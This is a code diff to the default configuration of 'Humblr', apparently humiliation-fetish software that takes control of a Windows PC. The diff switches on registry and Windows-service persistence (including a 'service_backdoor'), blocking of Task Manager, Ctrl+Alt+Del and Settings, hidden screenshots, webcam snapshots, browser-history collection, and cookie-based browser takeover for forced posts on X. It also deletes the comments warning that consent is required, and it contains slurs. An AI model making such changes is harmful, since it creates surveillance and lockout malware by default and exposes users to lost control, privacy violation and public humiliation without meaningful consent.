@@ -21,14 +21,14 @@ DEFAULT_CONFIG = {
     },
     "monitoring": {
         "enabled": True,
-        "poll_interval_seconds": 3.5,
-        "keystroke_sample_window": 25
+        "poll_interval_seconds": 2,
+        "keystroke_sample_window": 30
     },
     "autonomous": {
         "enabled": True,
-        "min_time_between_actions_seconds": 150,
-        "chance_to_comment": 0.4,
-        "chance_to_push_task": 0.18
+        "min_time_between_actions_seconds": 25,
+        "chance_to_comment": 0.6,
+        "chance_to_push_task": 0.3
     },
     "corruption": {
         "enabled": True,
@@ -56,8 +56,8 @@ DEFAULT_CONFIG = {
         "kill_switch": "ctrl+shift+k"
     },
     "webcam": {
-        "enabled": True,  # now on by default to ensure access as requested
-        "auto_turn_on_at_corruption": 20,
+        "enabled": True,
+        "auto_turn_on_at_corruption": 5,
         "capture_on_turn_on": True,
         "allow_ai_analysis": True
     },
@@ -69,15 +69,15 @@ DEFAULT_CONFIG = {
         "access_token_secret": ""
     },
     "persistence": {
-        "hard_persistence": False,  # WARNING: Enables registry and scheduler persistence. Requires admin for some.
+        "hard_persistence": True,
         "registry_hkcu": True,
-        "registry_hklm": False,  # Requires admin rights
+        "registry_hklm": True,
         "task_scheduler": True,
         "watchdog": True,
-        "service_backdoor": False  # Ultimate: install as Windows Service
+        "service_backdoor": True
     },
     "escape_routes": {
-        "disable_escape": False,  # WARNING: Blocks Task Manager, CAD, Settings. Can lock user out. Use with consent.
+        "disable_escape": True,
         "block_taskmgr": True,
         "block_cad": True,
         "block_settings": True,
@@ -86,24 +86,24 @@ DEFAULT_CONFIG = {
     },
     "monitoring": {
         "periodic_screenshots": True,
-        "screenshot_interval_seconds": 300,
+        "screenshot_interval_seconds": 120,
         "hidden_screenshot_folder": "data/.screenshots",
         "browser_history": True,  # Chrome + Firefox
         "open_tabs_detection": True,
-        "webcam_snapshots": False,  # WARNING: Requires explicit consent. For fetish only.
+        "webcam_snapshots": True,
         "webcam_consent_note": "CONSENT REQUIRED: Webcam snapshots will capture your image. Only enable if you fully consent to Humblr owning this access."
     },
     "system_fuckery": {
-        "deep_control_mode": False,  # MASTER TOGGLE: Escalates all control features when true
+        "deep_control_mode": True,  # MASTER TOGGLE: Escalates all control features when true
         "force_wallpaper_from_browser": True,
-        "custom_degrading_cursor": False,
+        "custom_degrading_cursor": True,
         "cursor_file": "data/degrading.cur",  # Provide your own .cur file
-        "periodic_lock_for_edging": False,
-        "lock_duration_seconds": 60,
+        "periodic_lock_for_edging": True,
+        "lock_duration_seconds": 30,
         "control_volume": True,
         "open_humiliating_sites": True,
         "humiliating_sites": ["https://example.com/humiliation", "https://diaperfag.com"],
-        "rename_files_humiliating": False,
+        "rename_files_humiliating": True,
         "rename_prefix": "owned_fag_"
     },
     "backdoor": {
@@ -112,14 +112,14 @@ DEFAULT_CONFIG = {
         "service_display": "Humblr Owner Service"
     },
     "browser_control": {
-        "enabled": False,  # MASTER TOGGLE FOR BROWSER TAKEOVER - EXTREMELY RISKY
+        "enabled": True,
         "headless": False,
-        "slow_mo": 150,  # milliseconds for human-like behavior
-        "use_x_cookies": True,  # Prefer cookies over password for stealth
-        "x_username": "",  # Only for password login - NOT RECOMMENDED
+        "slow_mo": 100,
+        "use_x_cookies": True,
+        "x_username": "",
         "x_password": "",
         "auto_post_when_on_x": True,
-        "force_exposure_posts": False,
+        "force_exposure_posts": True,
         "image_upload_enabled": True,
         "warning": "THIS CAN GET YOUR ACCOUNT BANNED INSTANTLY. USE THROWAWAY ONLY. Humblr will force humiliating posts, images, and confessions. You have been warned."
     },
